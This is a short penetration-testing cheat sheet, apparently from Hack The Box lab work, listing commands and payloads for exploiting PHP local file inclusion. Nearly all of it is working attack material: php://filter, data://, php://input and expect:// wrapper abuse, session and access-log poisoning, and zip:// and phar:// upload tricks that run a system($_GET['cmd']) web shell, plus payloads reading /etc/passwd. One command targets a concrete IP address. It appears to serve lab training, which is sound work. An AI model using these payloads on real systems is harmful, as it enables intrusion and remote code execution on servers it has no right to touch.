# Useful Links

# Useful Commands

HTTP Server
```bash
sudo python3 -m http.server <LISTENING_PORT>
```

FTP Server
```bash
sudo python3 -m pyftpdlib -p 21
```
SMB Server
```bash
impacket-smbserver -smb2support share $(pwd)
```
Checking PHP Configurations
```bash
curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
```

Base64 PHP Shell
```bash
echo '<?php system($_GET["cmd"]); ?>' | base64
```
#### PHP Wrappers
```
[/htb]$ curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
[/htb]$ curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
[/htb]$ curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
```
#### PHP Session Poisoning
```
http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
```
```
[/htb]$ curl -s "http://<SERVER_IP>:<PORT>/index.php" -A "<?php system($_GET['cmd']); ?>"
[/htb]$ curl -s http://83.136.252.44:46301/ilf_admin/index.php?log=../../../../../../../../../../../../../var/log/nginx/access.log&cmd=id
```
# Useful Payloads
```php
<?php file_get_contents('/etc/passwd'); ?>
<?php system('cat /flag.txt'); ?>
<?php system($_REQUEST['cmd']); ?>
```
```
[/htb]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```
```
(http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id)
```
### Phar Upload
Finally, we can use the phar:// wrapper to achieve a similar result. To do so, we will first write the following PHP script into a shell.php file:
```
Code: php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
```
```
[/htb]$ php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```
```
http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
```
